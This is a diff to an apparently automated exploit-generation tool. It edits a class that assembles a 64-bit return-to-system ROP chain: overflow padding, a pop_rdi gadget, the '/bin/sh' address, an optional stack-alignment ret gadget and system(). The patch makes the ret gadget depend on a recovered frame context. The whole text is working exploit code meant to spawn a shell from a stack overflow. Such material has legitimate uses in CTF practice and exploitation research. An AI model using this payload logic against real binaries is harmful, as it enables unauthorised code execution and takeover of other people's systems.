@@ -157,7 +157,15 @@ class Ret2SystemX64(ExploitPrimitive):
 
     Payload shape::
 
-        [A * ctx.padding] [p64(pop_rdi)] [p64(binsh)] [p64(ret)] [p64(system)]
+        [A * ctx.padding] [p64(pop_rdi)] [p64(binsh)] [p64(ret?)] [p64(system)]
+
+    The ``ret?`` gadget is included iff
+    ``ctx.frame_context.required_ret_count == 1`` (v4.0.5 — P6.2c
+    fix; replaces the v4.0.1 always-include / v4.0.2b magic-threshold
+    heuristic with a principled decision from the caller's frame).
+    When ``ctx.frame_context`` is ``None`` (defensive — orchestrator
+    always populates it now), defaults to including ``ret`` to
+    preserve the v4.0.1 always-align behaviour.
 
     Requires:
         * Same as :class:`Ret2SystemX32`, but 64-bit.
@@ -186,11 +194,22 @@ class Ret2SystemX64(ExploitPrimitive):
         if system_addr is None or binsh_addr is None:
             return b""
 
+        # v4.0.5 (P6.2c): principled ret-count from FrameContext
+        # (default True keeps v4.0.1 always-align behaviour when
+        # the recon phase did not populate frame_context —
+        # defensive fallback).
+        include_ret = bool(
+            ctx.frame_context.required_ret_count
+            if ctx.frame_context is not None
+            else 1
+        )
+        ret_gadget = p64(g.ret) if include_ret else b""
+
         return (
             b"A" * ctx.padding
             + p64(g.pop_rdi)
             + p64(binsh_addr)
-            + p64(g.ret)  # stack alignment gadget
+            + ret_gadget
             + p64(system_addr)
         )
 
